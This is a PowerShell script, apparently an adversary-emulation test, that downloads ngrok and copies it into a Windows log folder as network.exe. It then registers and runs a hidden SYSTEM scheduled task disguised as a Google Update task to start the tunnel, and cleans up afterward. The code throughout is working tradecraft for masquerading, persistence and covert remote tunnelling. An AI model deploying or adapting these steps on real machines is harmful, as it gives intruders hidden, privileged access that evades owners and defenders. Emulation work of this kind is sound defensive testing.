$taskName = "GoogleUpdateTaskMachineCore{24532E23-34EC-5236-8E8A-EEB10C475EB6}"
$targetPath = "$env:SystemRoot\Logs\NetSetup\network.exe"
$tempDir = "$env:TEMP\ngrok"
$xmlPath = "$env:TEMP\task.xml"
$ngrokUrl = "https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-windows-amd64.zip"
$success = $false

# Configure TLS
[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12

$xmlContent = @"
<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <RegistrationInfo>
    <Description>Google Update</Description>
    <URI>\GoogleUpdate</URI>
  </RegistrationInfo>
  <Triggers>
    <LogonTrigger>
      <Enabled>true</Enabled>
    </LogonTrigger>
    <RegistrationTrigger>
      <Enabled>true</Enabled>
    </RegistrationTrigger>
  </Triggers>
  <Principals>
    <Principal id="Author">
      <UserId>SYSTEM</UserId>
      <RunLevel>HighestAvailable</RunLevel>
    </Principal>
  </Principals>
  <Settings>
    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
    <AllowHardTerminate>false</AllowHardTerminate>
    <StartWhenAvailable>true</StartWhenAvailable>
    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
    <IdleSettings>
      <StopOnIdleEnd>false</StopOnIdleEnd>
      <RestartOnIdle>false</RestartOnIdle>
    </IdleSettings>
    <AllowStartOnDemand>true</AllowStartOnDemand>
    <Enabled>true</Enabled>
    <Hidden>true</Hidden>
    <RunOnlyIfIdle>false</RunOnlyIfIdle>
    <WakeToRun>false</WakeToRun>
    <ExecutionTimeLimit>PT0S</ExecutionTimeLimit>
    <Priority>5</Priority>
  </Settings>
  <Actions Context="Author">
    <Exec>
      <Command>"$targetPath"</Command>
      <Arguments>start --all</Arguments>
    </Exec>
  </Actions>
</Task>
"@

try {
    # Download ngrok
    Write-Host "[*] Downloading ngrok..."
    Invoke-WebRequest -Uri $ngrokUrl -OutFile "$env:TEMP\ngrok.zip" -ErrorAction Stop
    
    # Extract files
    Write-Host "[*] Extracting archive..."
    Expand-Archive -Path "$env:TEMP\ngrok.zip" -DestinationPath $tempDir -Force
    if (-not (Test-Path "$tempDir\ngrok.exe")) {
        throw "Ngrok extraction failed"
    }

    # Copy ngrok
    Write-Host "[*] Copying ngrok to system directory..."
    New-Item -Path (Split-Path $targetPath) -ItemType Directory -Force -ErrorAction Stop | Out-Null
    Copy-Item -Path "$tempDir\ngrok.exe" -Destination $targetPath -Force

    # Create task XML
    Write-Host "[*] Creating scheduled task..."
    $xmlContent | Out-File -FilePath $xmlPath -Encoding Unicode

    # Create task
    schtasks /Create /XML $xmlPath /TN $taskName /F 2>&1 | Out-Null
    if ($LASTEXITCODE -ne 0) {
        throw "Failed to create scheduled task"
    }

    # Run task
    Write-Host "[*] Starting ngrok service..."
    schtasks /Run /TN $taskName 2>&1 | Out-Null
    Start-Sleep -Seconds 5
    
    $success = $true
    Write-Host "[+] Operation completed successfully" -ForegroundColor Green
}
catch {
    Write-Host "[!] ERROR: $($_.Exception.Message)" -ForegroundColor Red
}
finally {
    # Cleanup operations
    Write-Host "[*] Performing cleanup..."
    
    # Delete scheduled task
    if (schtasks /Query /TN $taskName 2>$null) {
        schtasks /Delete /TN $taskName /F 2>&1 | Out-Null
        Write-Host "[+] Scheduled task removed"
    }

    # Remove target file
    if (Test-Path $targetPath) {
        Remove-Item -Path $targetPath -Force -ErrorAction SilentlyContinue
        Write-Host "[+] Target file removed"
    }

    # Clean temporary files
    $itemsToRemove = @(
        "$env:TEMP\ngrok.zip",
        $tempDir,
        $xmlPath
    )
    
    foreach ($item in $itemsToRemove) {
        if (Test-Path $item) {
            Remove-Item -Path $item -Recurse -Force -ErrorAction SilentlyContinue
            Write-Host "[+] Removed: $item"
        }
    }

    if (-not $success) {
        Write-Host "[!] Operation completed with errors" -ForegroundColor Red
    }
}